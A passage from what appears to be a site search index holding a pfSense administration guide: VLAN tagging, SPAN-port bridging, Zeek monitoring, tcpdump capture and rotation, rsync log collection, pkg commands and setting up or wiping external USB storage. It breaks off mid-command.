<p><code>Interfaces &gt; Switches &gt; VLANS</code></p> </li> </ul> <p>The only VLAN's tagged and grouped here are those built directly into the pfSense device's switch</p> <p>Upstream VLAN's (for example from an access point) are not shown here.</p> <p>VLAN's group ID number are related to the physical port on the box.</p> <p>The TAG number assigned by the user is part of the 802.1q standard to identify VLAN's and apply rules.</p> <p>EXAMPLE:</p> <p>If there are 5 ports on your switch, port 5 itself being the physical uplink to WAN, and 1-4 being individual ethernate ports;</p> <p>To keep them all separate, you would tag <code>5</code> on each VLAN, and leave the 1,2,3, or 4 untagged.</p> <pre><code>VLAN group  VLAN tag    Members      Description\n0           1           1,5          Default System VLAN\n1           120         2,5t         LAN2 VLAN\n2           130         3,5t         LAN3 VLAN\n3           140         4,5t         LAN4 VLAN\n</code></pre> <p>5 remains untagged on the default system VLAN group.</p> <p>Contrast the above to what the default VLAN mappings look like on the same device if you did not configure any VLANs:</p> <pre><code>VLAN group  VLAN tag    Members      Description\n0           1           1,2,3,4,5    Default System VLAN\n</code></pre> <p>SG-1100 VLAN Differences</p> <p>This device is configured as a 'router on a stick' where the chip is a single 'port' that's broken down logically into three separate ports, the difference being the three logical ports are phyiscal ports on the device. Because of this you will need to double tag based on the port you plan to use the VLANs with.</p> <pre><code>VLAN group  VLAN tag    Members      Description\n0           1           0            Default System VLAN\n1           4090        0t,3         WAN\n2           4091        0t,2         LAN\n3           4092        0t,1         OPT\n4           110         0t,1t        VLAN1                     # this line shows the double tagged VLAN\n                                                               # tagging the default `0` for the uplink,\n                                                               # as well as `1` since it's using the OPT port.\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#bridging-multiple-interfaces-for-port-mirroring-span-port-for-traffic-monitoring","title":"Bridging Multiple Interfaces for Port Mirroring (SPAN Port for Traffic Monitoring)","text":"<p>https://docs.netgate.com/pfsense/en/latest/bridges/create.html</p> <p>Define a set of interfaces to bridge, which become a single bridge interface, and a span port to view their traffic on, for IDS / monitoring.</p> <p>What you'll need:</p> <ul> <li>A free interface on the pfSense device to dedicate as a SPAN port, for mirroring traffic from all other ports connected to the bridge</li> </ul> <p>Step 1: Create the SPAN port interface</p> <ul> <li><code>Interfaces &gt; Assignments</code> Select the next free interface you have available, or bring down and repurpose an existing interface to be used as a SPAN port</li> <li>Enable interface</li> <li>Description: we'll use <code>SPAN0</code>, however you can name this whatever you like, as with any other interface.</li> <li>IPv4 Configuration Type: Static IPv4</li> <li>IPv6 Configuration Type: None</li> <li><code>Static IPv4 Configuration &gt; IPv4 Address</code>: Any RFC1918 address will work, for this example we'll use <code>10.8.4.1</code>, set the cidr range to <code>/32</code></li> <li>Block Bogon Networks</li> <li>Save</li> </ul> <p></p> <p>NOTE: this is best handled on a switch, not the router (pfSense in this case) itself. However for a small office / home office / lab use case, this is fine, and also what this guide will follow.</p> <p>Step 2: Create the BRIDGE interface</p> <p>You do not need a free interface before doing this, the BRIDGEx interface is a purely virtual interface meant to logically tie together any interfaces you specify as members of this bridge.</p> <ul> <li><code>Interfaces &gt; Assignments &gt; Bridges &gt; +Add</code></li> <li><code>Member Interfaces</code>: Ctrl+click to select all interfaces to monitor, their traffic is to be mirrored on the SPAN port via this BRIDGEx adapter.</li> </ul> <p>Selecting the interfaces:</p> <p></p> <p>NOTE: on VMware Workstation for Linux, this operation may stall here, or for example if you run tcpdump, or bring up a bridged or promiscuous interface. Switch over to your pfSense VM tab and see if there is a prompt regarding enabling promiscuous mode on the virtual network interfaces you selected. Select OK to acknowledge the prompt - this is normal and will not prevent pfSense from monitoring these virtual interfaces.</p> <ul> <li>Select <code>Advanced Options</code></li> <li><code>Span Port</code>: select the <code>SPAN0</code> interface we created above.</li> <li><code>Save</code></li> </ul> <p>Here's what BRDIGE0 should look like under <code>Interfaces &gt; Bridges</code>:</p> <p></p> <p>Next:</p> <ul> <li><code>Interfaces &gt; Assignments</code> choose to <code>+Add</code> the newest <code>BRIDGEx</code> interface, likely BRIDGE0</li> <li>Save</li> <li>Click the <code>OPTx</code> interface link for the newly created BRIDGEx</li> <li>Enable interface</li> <li>IPv4 Configuration Type: Static IPv4</li> <li>IPv6 Configuration Type: None</li> <li><code>Static IPv4 Configuration &gt; IPv4 Address</code>: Any RFC1918 address will work, for this example we'll use <code>10.9.9.1</code>, set the cidr range to <code>/32</code></li> <li>Block Bogon Networks</li> <li>Save</li> </ul> <p>Step 3: Confirm the interfaces are up &amp;&amp; monitoring</p> <ul> <li> <p>You do not need to configure DHCP server settings, each interface is a single host (/32) static IPv4 address.</p> </li> <li> <p>You do not need to configure any real firewall rules for the BRIDGEx or SPANx interfaces to monitor traffic. They both can have the single rule of \"Block bogon networks\" (which is also optional).</p> </li> </ul> <p>If you're curious how you can manage firewall / traffic filtering when using a bridge interface, see the pfSense documentation page here:</p> <p>https://docs.netgate.com/pfsense/en/latest/bridges/firewall.html</p> <p>Essentially the default setting in pfSense is to honor the rules already configured for the individual interfaces being monitored, and ignore rules on the bridge interface. In other words, the bridge is simply passive by default in that it is only monitoring traffic and not doing additional filtering.</p> <p>Under <code>System &gt; Advanced &gt; System Tunables</code> review the following values (<code>1=enabled</code>, <code>0=disabled</code>) this example shows the defaults described above:</p> <pre><code>net.link.bridge.pfil_member     Packet filter on the member interface   1\nnet.link.bridge.pfil_bridge     Packet filter on the bridge interface   0\n</code></pre> <p>Bridge interface firewall rules:</p> <p></p> <p>SPAN interface firewall rules:</p> <p></p> <p>The next steps will be easier to 'see' if you spin up a Live OS to connect to one of the LAN segments and generate some traffic. A Live OS is suggested due to the low resource and configuration requirements while you're testing and configuring Zeek.</p> <p>When you're ready, back on pfSense follow either the SSH or GUI instructions:</p> <ul> <li>[GUI]: Go to <code>Diagnostics &gt; Command Prompt</code></li> <li>[SSH]: SSH into the firewall, and ensure the management user can run commands with sudo</li> <li>Run <code>ifconfig</code> to identify the <code>emX</code> device with the description of <code>SPAN0</code> (or what you named it).</li> </ul> <p></p> <ul> <li>[GUI]: Go to <code>Diagnostics &gt; Packet Capture</code>, select <code>SPANx</code> for the <code>Interface</code>, <code>Port</code> of <code>53</code> and then click <code>Start</code></li> <li>[GUI]: After a minute or two passes, or you've manually generated some traffic (<code>dig @1.1.1.1 ubuntu.com</code> or <code>nslookup microsoft.com 9.9.9.9</code>) <code>Stop</code> the packet capture.</li> <li>[SSH]: Alternatively Run <code>sudo tcpdump -i emX -n -vv port 53</code> where emX is your SPAN port interface (ie; em5, yours could be different) and port 53 is easy to visually parse since it's only looking at DNS request.</li> </ul> <p>TO DO: See what changes are required to run <code>tcpdump</code> with -Z  to drop privileges. <p></p> <ul> <li>If you have devices on the network you should see traffic, and it should be under their assinged IP address on the network, which is exactly what we want.</li> <li>NOTE: This will capture traffic that does not pass (is dropped / rejected), for example if you have a subnet dedicated to malware analysis. This will capture or 'see' all of the DNS requests being made by all of the hosts on that subnet, even though no traffic is routed out of that network - if the packet hits the firewall, it can see it.</li> <li>You can verify this by watching the requests being monitored by the <code>SPAN0</code> port using the <code>tcpdump</code> command above</li> <li>In another SSH session window on the pfSense box, running <code>sudo tail -f /var/log/resolver.log</code> to see what DNS queries the firewall is actually resolving (this assumes you have set pfSense's DNS resolver to ignore external DNS servers, and only use it's own internal configuration to resolve queries as detailed above in this guide - as a reminder that forwards the queries over TLS upstream to cloudflare and quad9).</li> </ul> <p>Step 4: Configure Zeek to monitor the SPAN port</p> <ul> <li><code>System &gt; Package Manager &gt; Available Packages</code> install <code>zeek</code></li> <li>Go to <code>Services &gt; Zeek NSM &gt; General</code></li> <li>Enable Zeek NSM</li> <li>Hostname: <code>10.7.8.1</code>this is the IP address of the SPAN interface we assigned in the example above this section, yours may be different if you chose a different IP address and range.</li> <li>Zeek Interface(s): <code>SPAN0</code></li> <li>Local Network Configuration: The following private address ranges will be fine in most cases: <pre><code>10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\nfc00::/7\nfe80::/64\n</code></pre></li> </ul> <p>Step 5: [Optional] Configure Zeek as a cluster</p> <ul> <li>Go to <code>Services &gt; Zeek NSM &gt; Zeek Cluster</code></li> <li>Check <code>Enabled Zeek Cluster</code></li> <li>Manager, Proxy, Worker 1, and Worker 2 Hosts should be set to <code>127.0.0.1</code></li> <li>Set Worker 1 and Worker 2 Interfaces to <code>loopback</code></li> </ul> <p>If you run <code>zeekctl status</code> from the CLI or Command Prompt (GUI) and it still returns that Zeek is running as type <code>standalone</code> you may need to either reboot pfSense, or manually edit <code>/usr/local/etc/node.cfg</code></p> <p>Further configuration file examples for Zeek can be found here:</p> <p>https://github.com/activecm/docker-zeek/tree/master/etc</p> <p>Next, you'll want to install the zeek-open-connections zkg package if you plan to analyze this data with RITA</p> <p>All of the typical Zeek commands work from the SSH / Console CLI (The prompts will not work from the WebGUI), for example:</p> <pre><code>sudo zeekctl status\nsudo zkg refresh\nsudo zkg install zeek/activecm/zeek-open-connections\nsudo zkg list\n</code></pre> <p>Running those will install the zkg package successfully.</p> <p>IMPORTANT: It's recommened to reboot pfSense here for Zeek to fully restart with the latest configuration changes.</p> <p>One great feature of Zeek on pfSense is the real time inspection of all your bridged interfaces via the WebGUI.</p> <p>Go to <code>Services &gt; Zeek NSM &gt; Real Time Inspection</code> and select a Log file to view, and the Max lines to show at one time. With this you can view all data being captured live, for a quick visual inspection.</p> <p></p> <p>See Zeek Network Security Monitor (NSM) below for more details.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#using-a-managed-switch","title":"Using a managed switch","text":"<p>Cisco's explaination of unmanaged, smart, and managed switches is a good starting reference:</p> <p>https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking/understanding-the-different-types-of-network-switches.html#~feature-options</p> <p>Types:</p> <ul> <li>Unmanaged: plug and play, no configuration possible</li> <li>Smart: some advanced features, meant for edge of network (conference rooms, printing, labs)</li> <li>Managed: fully configurable, deployed at the core of the network for traffic shaping, QOS, IDS, etc.</li> </ul> <p>Options:</p> <ul> <li>Speeds 10|100|1000 mbps</li> <li>Ports 4|8|16|32|etc</li> <li>PoE: powers devices from the switch if they use PoE</li> <li>Stackable vs Standalone: standalone are static devices, stackable switches allow stacking multiple of the same unit, seemlessly with current configuration - supports failover if one unit fails, and routes traffic around it.</li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#logs","title":"Logs","text":"<p><code>Status &gt; System Logs &gt; Settings</code></p> <p>Log Message Format: <code>syslog</code></p> <ul> <li>[x] Forward / Reverse Display</li> </ul> <p>Log Rotation Size (bytes):</p> <pre><code>    Default: 512000 (500 KiB)\n</code></pre> <p>Recommended: 4000000 (4MB) This value may change depending on <code>Log Retention Count</code> and log storage policy</p> <p>Number of Logs:</p> <pre><code>    Default: 7\n</code></pre> <p>Recommended: Whatever works for your system. Keeping more logs that are all a small size is reasonable to still view in the Web GUI if you have space. Forwarding logs means you won't take up space on the pfSense machine.</p> <p>Useful log files:</p> Log File Path Logins <code>/var/log/auth.log</code> Dns Logs <code>/var/log/resolver.log</code> Firewall Logs <code>/var/log/filter.log</code>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#logging-network-traffic","title":"Logging Network Traffic","text":"<p>How to log and maintain network data using pfSense.</p> <p>This section would not exist without these resources:</p> <ul> <li>https://github.com/0ptsec/optsecdemo</li> <li>https://www.activecountermeasures.com/raspberry-pi-network-sensor-webinar-qa/</li> <li>https://github.com/william-stearns (wstearns-ACM) in the Threat Hunter Community Discord</li> <li>https://unix.stackexchange.com/questions/194863/delete-files-older-than-x-days (user basic6's answer)</li> </ul> <p>This is meant to run on any box with <code>tcpdump</code> available, and pairs well with the external storage section below:</p> <pre><code>sudo pw groupadd logsync\nsudo mkdir /mnt/external/pcaps\nsudo chown nobody:logsync /mnt/external/pcaps\nsudo chmod 750 /mnt/external/pcaps\nsudo pw groupmod logsync -m $YOUR_USER\n</code></pre> <p>Where <code>$YOUR_USER</code> is the account on pfSense you'll be connecting to over ssh to bring logs back to a central logging system.</p> <p>What this does is sets <code>pcaps/</code> to be owned by the user <code>nobody</code> and the group <code>logsync</code>, so when <code>tcpdump</code> drops privileges, the nobody user can write to that folder. The 5 in 750 allows any user that's part of the group <code>logsync</code> to view but not write to the folder. This is an easy way to limit permissions while scripting the collection of logs safely over ssh. The 0 in 750 prevents any other user context on the system from examining or modifying the pcaps.</p> <p>If you don't have an external storage device, be aware of your firewall's disk space and be sure to limit the pcap file rotation frequency via cron (below).</p> <p><code>tcsh</code> does not understand command substitution, just use <code>pfSense.%Y%m%d%H%M%S</code>... <pre><code>sudo /usr/sbin/tcpdump -i ethX -Z nobody -G 3600 -w /mnt/external/pcaps/pfSense.%Y%m%d%H%M%S.pcap\n</code></pre></p> <p>In all cases, replace <code>ethX</code> with the name of the interface you want to capture on. Ideally you would have a SPAN port that's mirroring traffic from all interfaces, and capture on that.</p> <p>pfSense running tcpdump unprivileged: <pre><code>sudo /usr/sbin/tcpdump -i ethX -Z nobody -G 3600 -w /tmp/pfSense.%Y%m%d%H%M%S.pcap '((tcp[13] &amp; 0x17 != 0x10) or not tcp)' &amp;\n</code></pre></p> <p>pfSense running tcpdump as root: <pre><code>sudo /usr/sbin/tcpdump -i ethX -G 3600 -w \"$(sudo mktemp -d)/pfSense.%Y%m%d%H%M%S.pcap '((tcp[13] &amp; 0x17 != 0x10) or not tcp)' &amp;\n</code></pre></p> <p>The easiest way to run these commands is by appending an <code>&amp;</code> to send them into the background. From here you can easily monitor them with <code>ps aux</code>.</p> <p>If you want to stop the capture running this way, obtain the pid of the root owned process running tcpdump you find with <code>ps aux</code>, then run <code>kill &lt;pid&gt;</code>.</p> <p>To rotate your pcap files based on a range of days, create the following task under <code>/etc/cron.d/pcap-rotation-service</code>: <pre><code># Cron task to rotate pcaps\n# Rotates pcap files under $PCAP_PATH based on the range of time in $DAYS\n# For example, +60 means the last 60 days of pcaps are maintained\n\n* 0  * * * root /usr/bin/find $PCAP_PATH -type f -mtime +$DAYS -delete\n</code></pre></p> <p>Replacing <code>$PCAP_PATH</code> with where you're storing your pcap files, and <code>$DAYS</code> with how many days of network traffic you want to maintain. This means you will always have pcaps available of the most recent 60 days.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#collecting-logs","title":"Collecting Logs","text":"<ul> <li>https://github.com/activecm/zeek-log-transport/blob/master/zeek_log_transport.sh</li> <li>https://github.com/opsdisk/the_cyber_plumbers_handbook</li> </ul> <p>To collect logs over ssh, you could use <code>cron</code> + <code>rsync</code> to automatically pull them into a central logging system.</p> <p>Modifying the ssh example from the rsync manual, here's what collecting logs from a pfSense system could look like: <pre><code>rsync -arv --safe-links --delete -e ssh pfsense@172.31.199.101:\"/mnt/external/pcaps/\" /home/ubuntu/Logs/pcaps/\n</code></pre></p> <p>This \"archives\" (preserves unix file characteristics) recursively and verbosely (<code>-arv</code>), the remote files, ignoring dangerous symlinks if files happen to have been tampered with (<code>--safe-links</code>), deleting any extraneous files locally that aren't present remotely (<code>--delete</code>), over ssh (<code>-e ssh</code>), from the remote path of <code>/mnt/external/pcaps</code> to the local path of <code>/home/ubuntu/Logs/pcaps</code>.</p> <p>If you need to use something like a jump proxy, the same command from above would look like this: <pre><code>rsync -arv --safe-links --delete -e \"ssh -J &lt;user&gt;@&lt;jump-hostname&gt;:&lt;port&gt;\" pfsense@172.31.199.101:\"/mnt/external/pcaps/\" /home/ubuntu/Logs/pcaps/\n</code></pre></p> <p>You'll want to review the rsync manual's <code>--rsh=COMMAND, -e</code> section for correctly encasing quotes and character escaping.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#upgrade-log","title":"Upgrade Log","text":"<p>https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html#upgrade-log</p> <p>A log of all latest upgrade attempts is kept at: <code>/conf/upgrade_log.latest.txt</code></p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#cli","title":"CLI","text":"<p>The FreeBSD Handbook will answer many of your questions in getting started here.</p> <p>https://docs.freebsd.org/en/books/handbook/basics/</p> <p>See the Netgate docs on troubleshooting &gt; lockout for various CLI examples</p> <p>https://docs.netgate.com/pfsense/en/latest/config/console-menu.html</p> <p>https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html</p> <p>By default pfSense has no <code>man</code> command to view manuals like Linux or macOS typically has.</p> <p>Running a command either with <code>--help</code>, <code>-h</code>, or without arguments will likely print basic usage details</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#cli-firewall","title":"CLI: Firewall","text":"<p>https://docs.netgate.com/pfsense/en/latest/firewall/pf-ruleset.html</p> <p>https://docs.freebsd.org/en/books/handbook/firewalls/#firewalls-pf</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#cli-system-services","title":"CLI: System Services","text":"<p>https://docs.freebsd.org/en/books/handbook/config/</p> <p>Service scripts are handled by rc.d:</p> <p><code>/etc/rc.d/*</code> <code>/usr/local/etc/rc.d/*</code></p> <p>Check if a service is running:</p> <pre><code>service &lt;service&gt; status|onestatus\nservice sshd onestatus\n</code></pre> <p>Restart a service: <pre><code>service sshd restart\n</code></pre></p> <p>Some services cannot be managed this way. You will need to either manage these from the WebGUI or by using common BSD commands.</p> <p>Unbound is an example of this. Sometimes the daemon is running but isn't resolving domains, or writing to the log file correctly.</p> <p>To restart unbound:</p> <pre><code># You can see the commandline invocation that the system uses to start unbound with:\nps aux | grep \"^unbound\"\n\n# Obtain the pid:\nps aux | grep \"^unbound\" | cut -d ' ' -f 2\n\n# Stop unbound\nsudo kill &lt;pid&gt;\n\n# Start unbound\nsudo /usr/local/sbin/unbound -c /var/unbound/unbound.conf\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#packages","title":"Packages","text":"<p>https://docs.freebsd.org/en/books/handbook/ports/</p> <p>Fix a broken pkg db:</p> <p>https://docs.netgate.com/pfsense/en/latest/troubleshooting/pkg-broken-database.html</p> <p>TIP: pfSense has <code>git</code> available as a package. <code>sudo pkg install -y git-\\*</code></p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#pkg-binaries-and-pfsense-webgui-availability","title":"pkg Binaries and pfSense WebGUI Availability","text":"<p>pfSense has two binaries for package management, <code>pkg</code> and <code>pkg-static</code>.</p> <pre><code>/usr/sbin/pkg\n/usr/local/sbin/pkg-static\n</code></pre> <p>The official documentation recommends using <code>pkg-static</code> to [re]install packages.</p> <p>It's not clear what the difference is between the two, both appear to work similarly for basic package management functions.</p> <p>In any case you will need to install the corresponding pfSense package if one exists for a package you want to install, for example:</p> <pre><code>user@pfSense: pkg search nmap\nnmap-7.91_3         Port scanning utility for large networks\npfSense-pkg-nmap-1.4.4_5    pfSense package nmap\n</code></pre> <p>If you install <code>nmap-7.91_3</code> by itself, you can still use <code>nmap</code> from the commandline, however <code>Diagnostics &gt; Nmap</code> will not be available in the WebGUI without also installing <code>pfSense-pkg-nmap-1.4.4_5</code></p> <p>As version numbers can change, you may simply use <code>&lt;package-name&gt;</code> and <code>pfSense-pkg-&lt;package-name&gt;</code> to install both at once, like this:</p> <pre><code>sudo pkg install -y nmap pfSense-pkg-nmap\n</code></pre> <p>Print a list of all currently installed packages:</p> <pre><code>pkg info\n</code></pre> <p>Update the package repository metadata:</p> <pre><code>sudo pkg update -f\n</code></pre> <p>Upgrade currently installed packages with available updates:</p> <pre><code>sudo pkg upgrade\n</code></pre> <p>Remove packages installed as dependencies that are no longer needed (leaf packages):</p> <pre><code>sudo pkg autoremove\n</code></pre> <p>Clean the pkg cache:</p> <pre><code>sudo pkg clean\n# or all:\nsudo pkg clean -a\n</code></pre> <p>Get detailed information on a particular package:</p> <pre><code>pkg info openvpn\n</code></pre> <p>Search the binary package repository for an application</p> <pre><code>pkg search openvpn\n</code></pre> <p>Install package(s):</p> <pre><code>sudo pkg install -y sudo zeek pfSense-pkg-sudo pfSense-pkg-zeek\n</code></pre> <p>Uninstall an installed package:</p> <pre><code>sudo pkg delete curl\n# or\nsudo pkg remove curl\n\n# escape wildcards with '*'\nsudo pkg delete pstree-\\*\n</code></pre> <p>Audit currently installed packages for known vulnerabilities:</p> <pre><code>sudo pkg audit -F\nFetching vuln.xml.xz: 100%  941 KiB 963.5kB/s    00:01\nopenvpn-2.5.4_1 is vulnerable:\n  openvpn -- Potential authentication by-pass with multiple deferred authentication plug-ins\n  CVE: CVE-2022-0547\n  WWW: https://vuxml.FreeBSD.org/freebsd/45a72180-a640-11ec-a08b-85298243e224.html\n\ndnsmasq-2.86,1 is vulnerable:\n  dnsmasq -- heap use-after-free in dhcp6_no_relay\n  CVE: CVE-2022-0934\n  WWW: https://vuxml.FreeBSD.org/freebsd/3f321a5a-b33b-11ec-80c2-1bb2c6a00592.html\n\nstrongswan-5.9.4 is vulnerable:\n  strongswan - Incorrect Handling of Early EAP-Success Messages\n  CVE: CVE-2021-45079\n  WWW: https://vuxml.FreeBSD.org/freebsd/ccaea96b-7dcd-11ec-93df-00224d821998.html\n\ncyrus-sasl-2.1.27_2 is vulnerable:\n  cyrus-sasl -- Fix off by one error\n  CVE: CVE-2019-19906\n  WWW: https://vuxml.FreeBSD.org/freebsd/a80c6273-988c-11ec-83ac-080027415d17.html\n\n4 problem(s) in 4 installed package(s) found.\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#package-zeek-network-security-monitor-nsm","title":"Package: Zeek Network Security Monitor (NSM)","text":"<p>Install Zeek from the packages list <code>System &gt; Package Manager &gt; Available Packages</code>, search for <code>zeek</code></p> <p>Or with pkg:</p> <pre><code>sudo pkg install -y zeek pfSense-pkg-zeek\n</code></pre> <p>Zeek filesystem locations:</p> <pre><code>/usr/local/etc/node.cfg\n/usr/local/etc/networks.cfg\n/usr/local/etc/zeekctl.cfg\n/usr/local/bin/zeek*\n/usr/local/share/zeek/*\n/usr/local/share/zeek/site/local.zeek\n/usr/local/share/zeek/site/local.zeek.sample\n/usr/local/logs/*\n/usr/local/logs/yyyy-mm-dd/\n/usr/local/logs/current -&gt; /usr/local/spool/zeek\n/usr/local/logs/stats\n</code></pre> <p>Zeek should have an entry automatically added under <code>/etc/crontab</code> to restart it if it is not running:</p> <pre><code>*/5 *   *   *   *   root    /usr/local/bin/zeekctl cron\n</code></pre> <p>Review the local zeek log files from SSH:</p> <pre><code>zgrep 'gitlab.com' /usr/local/logs/yyyy-mm-dd/dns.*.log.gz\n</code></pre> <p>TO DO: provide an example cron task that tar archive's zeek logs and prepares them to be retreived + deleted from the pfSense system over SSH for external storage + analysis with RITA.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#zeek-configuration","title":"Zeek Configuration","text":"<p>Zeek has a few easy to navigate configuration pages under <code>Services &gt; Zeek NSM</code></p> <ul> <li> <p>Standalone configuration is an option, however only one interface can be monitored at a time. NOTE: This works great for monitoring a SPAN / Mirror port directly on the local pfSense device.</p> </li> <li> <p>Hostname: <code>127.0.0.1</code>, this can alternatively be the IP address of the <code>SPAN0</code> interface if you've configured one for port mirroring.</p> </li> <li> <p>Zeek Interfaces: <code>interface</code>, this can be the <code>SPAN0</code> interface.</p> </li> <li> <p>Local Network Configuration: local subnets to monitor, usually private address ranges such as these: <pre><code>10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\nfe80::/64\nfc00::/7\n</code></pre></p> </li> </ul> <p>Alternatively, configuring Zeek as a <code>Cluster</code> is recommened even on a single box.</p> <p>This is essentially the same as standalone in this instance, except it allows Zeek to listen on up to two interfaces, and potentially connect with with other nodes should you expand later on.</p> <p>Below is an example listening on two internal interfaces:</p> <pre><code>Manager: `127.0.0.1`\nProxy: `127.0.0.1`\nWorker 1 Host: `127.0.0.1`    # workers use localhost when manager does, else you'll see errors in the system log trying to use the interface address\nWorker 1 Interface: `OPT1`\nWorker 2 Host: `127.0.0.1`    # workers use localhost when manager does, else you'll see errors in the system log trying to use the interface address\nWorker 2 Interface: `OPT2`\n</code></pre> <p>Confirm your configurations over SSH or with <code>Diagnositcs &gt; Command Prompt</code>:</p> <pre><code>cat /usr/local/etc/node.cfg\n</code></pre> <p>Seeing this configuration file's comments will likely help you visualize the configuration of standalone vs cluster better.</p> <p>NOTE: In a cluster configuration, Zeek can only monitor up to 2 network interfaces. It's recommended you create a BRIDGE and SPAN interface for port mirroring if you need to monitor more than 1 interface.</p> <p>Use <code>Services &gt; Zeek NSM &gt; Realtime Inspection</code> to monitor data live</p> <p>As of pfSense 2.5.2, check to ensure <code>/usr/local/share/zeek/site/local.zeek</code> exists.</p> <p>If not, create it from the default example file in the same directory:</p> <pre><code>cp /usr/local/share/zeek/site/local.zeek.sample /usr/local/share/zeek/site/local.zeek\n</code></pre> <p>Running Zeek Unprivileged</p> <p>TO DO: Provide an example of how to do this.</p> <p>Excerpt from the installer:</p> <pre><code>The rc.d script now honors the zeek_user rc.d variable.  To run as\na user other than root (the default) you need to make a few changes.\nFor example to run as the user zeek, add this to /etc/rc.conf:\n\n    zeek_enable=\"YES\"\n    zeek_user=\"zeek\"\n\nAdd this to /etc/devfs.conf:\n\n    own     bpf     root:bpf\n    perm    bpf     0660\n\nAnd add zeek to the bpf group:\n\n    bpf:*:81:zeek\n\nand restart the devfs service:\n\n    service devfs restart\n\nor reboot.\n\nIf the interface defined in node.cfg is configured for NIC checksum\noffloading (the default when this feature is supported by the\nhardware) you will want to set ignore_checksums in site/local.zeek:\n\n    redef ignore_checksums = T;\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#external-storage","title":"External Storage","text":"<p>While pfSense should mainly be used as a firewall, and is not meant for long term storage or as a central logging server, it's ability to do a number of network forensics and debugging means at some point you may need to temporarily add external storage to the device. This is a good idea instead of letting a packet capture run overnight, only to later discover the partition (or worse the entire filesystem) has been flooded and no new data can be written, effectively halting the operation of your firewall.</p> <p>The easiest way to walk through and familiarize yourself with these steps is in a VM. Pass through an external USB device to get started.</p> <p>The FreeBSD documentation on both USB disks and Adding Disks will help guide you through this process.</p> <p>The first thing you'll see from a terminal when connecting the external device, in this example we'll use a 64GB USB drive, is the device's entry in <code>dmesg</code>. Use <code>dmesg | grep '&lt;device&gt;'</code> to review this information later (where <code>&lt;device&gt;</code> for example could be <code>da1</code>).</p> <p>We'll also use <code>da1</code> as the device name for the rest of these examples.</p> <p>Confirm the device's name under <code>/dev/</code> with <code>ls -l /dev/da1*</code></p> <p>From here follow the steps in the FreeBSD manual to create a new UFS (this will work fine even if pfSense is running on a ZFS):</p> <ul> <li>https://www.freebsd.org/cgi/man.cgi?query=gpart&amp;sektion=8&amp;format=html#EXAMPLES</li> <li>https://docs.freebsd.org/en/books/handbook/disks/#usb-disks</li> </ul> <p>The following commands are mostly mirrored directly from those pages linked above:</p> <pre><code>sudo gpart destroy -F da1\nsudo gpart create -s GPT da1\nsudo gpart add -t freebsd-ufs -a 1M da1\ngpart show da1\n\nsudo newfs -U /dev/da1p1\n\nsudo vi /etc/fstab\n</code></pre> <p>Add the following to <code>/etc/fstab</code>, replacing \"external\" with whatever you'd like to name your device's mount point: <pre><code>/dev/da1p1      /mnt/external   ufs rw  2   2\n</code></pre></p> <p>Finally, create the mount point and mount the device: <pre><code>sudo mkdir /mnt/external\nsudo mount /mnt/external\n</code></pre></p> <p>Your external storage is ready for use. Be sure to create a folder within this filesystem that is writable by the correct users (if you don't want to be running as root to write to it).</p> <p>To undo all of these steps, erasing the external device to an empty state and removing the external filesystem from pfSense:</p> <pre><code>sudo umount /mnt/external\nsudo gpart destroy -F da1\nsudo rm -rf /mnt/external\n\nsudo vi /etc/fstab\n# remove the entry with the external filesystem's mount point\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#zfs","title":"ZFS","text":"<p>The same can be done with <code>zfs</code>. First, be sure the device is completely empty and not mounted to the filesystem.</p> <p>If it's currently mounted, <code>zpool</code> will raise an error. If it's not empty, this operation will make the data (likely) unrecoverable.</p> <pre><code>sudo umount /mnt/external\nsudo gpart destroy -F da1\n</code></pre> <p>The zfs chapter in the FreeBSD handbook goes into detail on how you can configure this type of filesystem.</p> <p>This Ubuntu tutorial on setting up zfs storage is also a good point of reference.</p> <p>For our purposes, to quickly attach an external device (taken and adapted from the examples linked above):</p> <pre><code>sudo mkdir /mnt/external\nsudo zpool create -m /mnt/external external /dev/da1\n</code></pre> <p>This will mount the device at <code>/external</code> and show it under <code>df -h</code> as well as <code>mount</code>.</p> <p>When you're done, to erase the device and it's contents from the filesystem:</p> <pre><code>sudo zpool destroy external\n</code></pre> <p>You may also notice even after erasing this device with <code>dd</code>, <code>gpart</code>, or <code>zpool</code>, the device still contains the <code>zfs_member</code> label.</p> <p>There are two ways to do this. Using <code>zpool</code>, this stackexchange post demonstrates the command:</p> <ul> <li>https://unix.stackexchange.com/questions/335377/zero-out-deprecated-zfs-label-from-disk-with-dd</li> </ul> <pre><code>sudo zpool labelclear /dev/da1\n</code></pre> <p>Another way is to erase both the beginning and the end of the device with <code>dd</code>. This can be done using the <code>seek</code> option.</p> <ul> <li>https://www.gnu.org/software/coreutils/manual/html_node/dd-invocation.html#dd-invocation</li> </ul> <p>A way to calculate the offset is by obtaining the device size in MB with <code>dmesg</code>:</p> <pre><code>dmesg | grep 'byte sectors'\n</code></pre> <p>You're looking for the line in dmesg starting with our device name, in this example it's <code>da1</code>.</p> <p>Using the same example of a 64GB disk, we see <code>58656MB</code> as the total size. We want to aim for the last few MB, so we'll use <code>58650</code> in our command.</p> <p>These two <code>dd</code> commands will successfully remove the zfs label:</p> <pre><code>sudo dd if=/dev/zero of=/dev/da1 bs=1M status=progress count=10\nsudo dd if=/dev/zero of=/dev/da1 bs=1M status=progress 